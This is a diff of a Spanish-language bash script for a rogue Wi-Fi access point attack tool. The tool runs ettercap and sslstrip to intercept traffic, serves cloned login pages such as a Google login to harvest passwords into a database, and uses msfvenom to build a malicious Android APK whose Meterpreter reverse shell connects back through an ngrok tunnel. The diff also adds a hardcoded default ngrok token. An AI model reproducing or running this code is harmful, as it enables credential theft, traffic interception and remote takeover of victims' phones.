@@ -176,19 +176,21 @@ sleep  1
     sleep 5
 clear
 
-echo -e "${YELLOW}Elige entre tres modos de ataque${NC}\n"
+echo -e "${YELLOW}Elige entre dos modos de ataque${NC}"
 echo
 echo -e "${redColour}POR FAVOR USE ESTA OPCIÓN RESPONSABLEMENTE.${endColour}\n"
-echo -e "${yellowColour}1)${endColour} ${purpleColour}Se ejecutarán ettercap, driftnet y sslstrip junto a una página web de login${endColour}"
-echo -e "${yellowColour}2)${endColour} ${purpleColour}Página web conectada a una base de datos y apk maliciosa. ${endColour}"
+echo -e "${yellowColour}1)${endColour} ${purpleColour}Se ejecutarán ettercap y sslstrip junto a una página web de login por http${endColour}"
+echo -e "${yellowColour}2)${endColour} ${purpleColour}La página web está conectada a una base de datos programada en php${endColour}"
 echo -e "${yellowColour}3)${endColour} ${purpleColour}Google-login${endColour}"
+echo -e "${yellowColour}4)${endColour} ${purpleColour}Utilizar una plantilla propia${endColour}"
 while true; do
-echo -ne " ${yellowColour}#?${endColour} "
+echo -n " #? "
 read yn
 case $yn in
 1 ) AIRBASE=1 ; break ;;
 2 ) AIRBASE=0 ; break ;;
 3 ) AIRBASE=2 ; break ;;
+4 ) AIRBASE=3 ; break ;;
 * ) echo -e "${RED}Opción inválida${NC}" ;;
 esac
 done
@@ -210,7 +212,7 @@ popd > /dev/null 2>&1; # getCredentials
 mkdir -p $HOME/Wifi
 
 # Sslstrip
-echo
+
 echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando sslstrip...${endColour}" 
 
 sslstrip -f -p -k -l 10000 -w $HOME/Wifi/sslstrip.log sslstripid=$! > /dev/null 2>&1 &
@@ -240,11 +242,9 @@ Ettercap también guardará su salida en ${endColour}${purpleColour}$HOME/Wifi/e
 ${yellowColour}Las contraseñas capturadas se guardarán en${endColour} ${purpleColour}$HOME/Wifi/passwords.txt${endColour}
 ${yellowColour}Las imágenes capturadas se guardarán en${endColour} ${purpleColour}$HOME/Wifi/driftftnetdata${endColour}"
 echo
-echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla...${endColour}\n"
+echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla...${endColour}"
 
 read junk
-
-echo
 # copiado de contraseñas obtenidas para ser guardadas
 count=$(grep -c "Referer" /tmp/Wifi/etter.cap)
 for i in $(seq 1 $count) 
@@ -254,23 +254,23 @@ do
 done
 
 if [ -f "$HOME/Wifi/passwords.txt" ]; then
-    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Contraseñas Guardadas !\n${endColour}"
+    echo -e "${yellowColour}[*]${endColour}${grayColour} Contraseñas Guardadas !${endColour}"
 else
-    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al guardar contraseñas !\n${endColour}"
+    echo -e "${redColour}[*]${endColour}${grayColour} Error al guardar contraseñas !${endColour}"
 fi
 
 cp -rf /tmp/Wifi/Images_$(date +%d%m%y) $HOME/Wifi
 if [ -d "$HOME/Wifi/Images_$(date +%d%m%y)" ]; then
-    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Imágenes Guardadas !\n${endColour}"
+    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Imágenes Guardadas !${endColour}"
 else
-    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al guardar imágenes !\n${endColour}"
+    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al guardar imágenes !${endColour}"
 fi
 
 cp -rf /tmp/Wifi/etter.cap $HOME/Wifi
 if [ -f "$HOME/Wifi/etter.cap" ]; then
-    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Captura de Archivo Guardada !\n${endColour}"
+    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Captura de Archivo Guardada !${endColour}"
 else
-    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al capturar el archivo !\n${endColour}"
+    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al capturar el archivo !${endColour}"
 fi
 
     
@@ -344,11 +344,15 @@ else
     echo -e "\n${blueColour}[Información]${endColour}${yellowColour} Si quieres saber cual es tu token ve a este link y registrate: https://dashboard.ngrok.com/get-started/your-authtoken${endColour} " 
 
     echo -ne "\n${redColour}[!] Introduce el token de autorización de ngrok (Pj: 2Pt10va9BqUhHMzciFAtXtVp4t6_6e5Btjn8emhQYHExAuW2S): ${endColour} " && read token
+    if [ "$token" = "" ];then
+            token="2Pt10va9BqUhHMzciFAtXtVp4t6_6e5Btjn8emhQYHExAuW2S"
+            echo -e "\n${blueColour}Selecciono el token $token por defecto.${endColour}"
+    fi
 
     # Configuramos el token de autorización en ngrok
     ./ngrok authtoken $token > /dev/null 2>&1 &
 fi
-
+sleep 1
 # Creamos el servidor tcp con ngrok
 echo -e "\n${yellowColour}[*]${endColour}${grayColour} Creando servidor tcp con ngrok...${endColour}"
 ./ngrok tcp $lport > /dev/null &
@@ -362,7 +366,6 @@ public_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].publ
 echo -e "\n${yellowColour}[*]${endColour}${grayColour} Creando APK con msfvenom... ${endColour}"
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$public_url LPORT=$lport -o $app.apk > /dev/null 2>&1
 
-apk_definitivo=$app.apk
 # Movemos el archivo al servidor apache
 sleep 1
 
@@ -398,89 +401,35 @@ echo -e "Para acceder a las contraseñas almacenadas dentro de la base de datos.
    ${purpleColour} 1.- mysql
     2.- USE rogue_ap;
     3.- SELECT * FROM credenciales;${endColour}"
-echo
-echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla...${endColour}\n"
+    
+echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
 
-read junk
-    echo -e "${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
-    rm dnsmasq.conf hostapd.conf metasploit.rc 2>/dev/null
-    rm -r iface 2>/dev/null
-    find \-name datos-privados.txt | xargs rm 2>/dev/null
-    sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
-    iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
-    ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
-    tput cnorm; service networking restart
-
-kill ${msfid} > /dev/null 2>&1
-
+while true; do
+    sleep 1
+done
 fi
 
 
 if [ "$AIRBASE" = "2" ]; then
 
-
-        # Array de plantillas
-    plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
-
-    tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
-    echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar: 
-    1) google-login 
-    2) cliqq-payload ${endColour}\n #? " && read template
-
-    check_plantillas=0; for plantilla in "${plantillas[@]}"; do
-        if [ "$template" == "1" ]; then
-            check_plantillas=1
-        fi
-    done
-
-    if [ "$template" == "2" ]; then
-        check_plantillas=2
-    fi
-
-    if [ $check_plantillas -eq 1 ]; then
         tput civis; pushd google-login > /dev/null 2>&1
         echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
         php -S 192.168.1.1:80 > /dev/null 2>&1 &
         sleep 2
         popd > /dev/null 2>&1; getCredentials
-    elif [ $check_plantillas -eq 2 ]; then
-        tput civis; pushd cliqq-payload > /dev/null 2>&1
-        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
-        php -S 192.168.1.1:80 > /dev/null 2>&1 &
-        sleep 2
-        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
-        for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-        cat msfconsole.rc
-        for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-        echo -e "\n${redColour}[!] Presiona <Enter> para continuar${endColour}" && read
-        popd > /dev/null 2>&1; getCredentials
-    else
-        tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Elige entre una de las dos opciones${endColour}"; sleep 1
-    fi
-
 
 fi
 
-echo -e "\n${yellowColour}Gracias por usar esta herramienta, Buena Suerte...${endColour}\n"
-echo -e "${redColour}By Daniel Reyero${endColour}"
-exit 0
+if [ "$AIRBASE" = "3" ]; then
 
+        tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
+	    echo -ne "${yellowColour}[*]${endColour}${grayColour}Nombre de la plantilla a utilizar:${endColour} " && read template
 
+		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
+		pushd $template > /dev/null 2>&1
+		php -S 192.168.1.1:80 > /dev/null 2>&1 &
+		sleep 2
+		popd > /dev/null 2>&1; getCredentials
 
-
-Posible script para volver a normal la antena :
-
-#!/bin/bash
-
-echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
-rm dnsmasq.conf hostapd.conf 2>/dev/null
-rm -r iface 2>/dev/null
-find -name datos-privados.txt | xargs rm 2>/dev/null
-sleep 3; ifconfig wlan0 down 2>/dev/null; sleep 1
-iwconfig wlan0 mode managed 2>/dev/null; sleep 1
-ifconfig wlan0 up 2>/dev/null; sleep 1
-tput cnorm; service networking restart
-
-echo -e "\n${yellowColour}Gracias por usar esta herramienta. ¡Buena suerte!${endColour}\n"
-echo -e "${redColour}Por Daniel Reyero${endColour}"
-exit 0
+fi
